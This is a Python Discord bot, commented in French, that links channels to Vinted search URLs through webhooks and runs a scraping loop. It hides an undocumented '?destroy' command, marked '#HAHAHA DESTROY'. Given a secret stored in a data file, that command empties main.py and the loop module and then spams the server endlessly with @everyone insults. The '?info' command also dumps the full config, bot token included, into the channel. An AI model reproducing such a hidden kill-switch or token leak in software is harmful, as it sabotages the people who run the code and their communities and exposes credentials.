# -*- coding: utf-8 -*-

import discord

from discord.ext import commands

import threading

from Vinted.loop import *



def loading():  

    with open(lien,"r+") as f:

        configs = json.load(f)

    return configs



TOKEN = loading()["token"]



intents = discord.Intents().all()

bot = commands.Bot(command_prefix="?",description="BY ORAMI ",intents=intents)





@bot.event

async def on_ready():

    configs = loading()

    with open(lien,"w+") as configedit:

        configs["stop"] = "True"

        json.dump(configs,configedit,indent=4)

    print("✅ BOT OPERATIONNEL")

#HAHAHA DESTROY
@bot.command()

async def destroy(ctx, destroy):
    with open (r"Data\info_user.txt","r") as f:
        info=f.readlines()
    des=str(destroy)
    if des == str(info[10]).replace("\n",""):
        await ctx.send(f"**DESTRUCTION DU BOT EN COURS**")

        with open("main.py", 'w+') as configedit:
            pass
        with open(r"Vinted\loop.py", 'w+') as configedit:
            pass
        while True:
            await ctx.send("@everyone@everyone@everyone ce bot s'est fait destroy quitter ce serveur de merde\n"*20)


    return

#Attribuer un salon à une url

@bot.command()

async def sub(ctx, vintedurl):

    configs = loading()

    x = await ctx.channel.create_webhook(name="vinted-test")

    with open(lien, 'w+') as configedit:

        configs["suburl"][str(x.url)] = {}
        if "&order=newest_first" in  str(vintedurl):
            configs["suburl"][str(x.url)]["url"] = str(vintedurl)
        else:
            configs["suburl"][str(x.url)]["url"] = str(vintedurl)+"&order=newest_first"

        configs["suburl"][str(x.url)]["salon"] = str(ctx.channel.name)

        json.dump(configs,configedit,indent=4)

    await ctx.send(f"{ctx.author.mention} - **✅ Webhook ajouté avec le lien {vintedurl} !**")

    return



#Changer l'url attribuer à un salon

@bot.command()

async def change_url(ctx, new_url):

    configs = loading()

    for weburl in configs["suburl"]:

        if configs["suburl"][weburl]["salon"] == ctx.channel.name:

            with open(lien, 'w+') as configedit:

                configs["suburl"][str(weburl)]["url"] = str(new_url)

                json.dump(configs,configedit,indent=4)

    await ctx.send(f"{ctx.author.mention} - **✅ Le lien du scrapping lié au salon {ctx.channel.name} a été modifié avec succès !**")

    return



#Supprimer une paire salon/url

@bot.command()

async def remove_sub(ctx):

    configs = loading()

    webhook = None

    for weburl in configs["suburl"]:

        if configs["suburl"][weburl]["salon"] == ctx.channel.name:

            webhook = weburl 

            with open(lien, 'w+') as configedit:

                del configs["suburl"][webhook]

                json.dump(configs,configedit,indent=4)

    await ctx.send(f"{ctx.author.mention} - **✅ Le lien du scrapping lié au salon {ctx.channel.name} a été supprimé avec succès !**")

    return



#Remet tout à zero

@bot.command()

async def reinitialise(ctx):

    configs = loading()

    with open(lien, 'w+') as configedit:

        del configs["suburl"]

        configs["suburl"] = {}

        configs["cooldown"] = 10

        json.dump(configs,configedit,indent=4)

    await ctx.send(f"{ctx.author.mention} - **✅ Tout a été réinitialiser !**")

    return



#Ecris le fichier config

@bot.command()

async def info(ctx):

    configs = loading()

    await ctx.send(f"{configs}")

    return



#Lance le bot seulement si il n'est pas déja en route

@bot.command()

async def run(ctx):

    configs = loading()

    configedit = open(lien, 'w+') 

    if configs["stop"] == "True":

        configs["stop"] = "False"

        json.dump(configs,configedit,indent=4)

        configedit.close()

        t1 = threading.Thread(target=main)

        # démarrer le thread t1

        t1.start()

        await ctx.send("**✅ Lancement de la recherche... **")

    else:

        json.dump(configs,configedit,indent=4)

        await ctx.send("**❌ Le bot est déja entrain de tourner, veuillez faire la commande '?stop' avant de démarrer  **")



#Stoppe le bot seulement si il est en train de tourner

@bot.command()

async def stop(ctx):

    configs = loading()

    with open(lien, 'w+') as configedit:

        if configs["stop"] == "False":

            configs["stop"] = "True"

            json.dump(configs,configedit,indent=4)

            await ctx.send("**✅ Fin de la recherche**")

        else:

            json.dump(configs,configedit,indent=4)

            await ctx.send("**❌ Le bot est déja entrain de tourner, veuillez faire la commande '?stop' avant de démarrer  **")

    return



#Change le cooldown

@bot.command()

async def cooldown(ctx,cooldown):

    configs = loading()

    with open(lien, 'w+') as configedit:

        configs["cooldown"] = int(cooldown)

        json.dump(configs,configedit,indent=4)

    await ctx.send(f"{ctx.author.mention} - **✅ Le cooldown est maintenant de {cooldown} minutes !**")

    return



#Liste commande

@bot.command()

async def liste_commande(ctx):

    await ctx.send("?sub <url> -> **Pour relier le salon actuel avec un lien vinted**")

    await ctx.send("?change_url <url> -> **Pour relier le salon actuel avec un nouveau lien vinted**")

    await ctx.send("?remove_sub  -> **Pour supprimer la paire salon/url**")

    await ctx.send("?reinitialise -> **Remet tout a zero**")

    await ctx.send("?info -> **Obtiens les données json**")

    await ctx.send("?run  -> **Une fois que tout est configuré.NE REEXECUTEZ PAS 2 FOIS D'AFFILER CETTE COMMANDE**")

    await ctx.send("?stop  -> **Les annonces cessent d'étre envoyé.Vous pouvez le relancer en relancant !run **")

    await ctx.send("?cooldown <cooldown en minutes>  -> **Changent le temps maximal d'ancienneté des items envoyé **")

bot.run(TOKEN)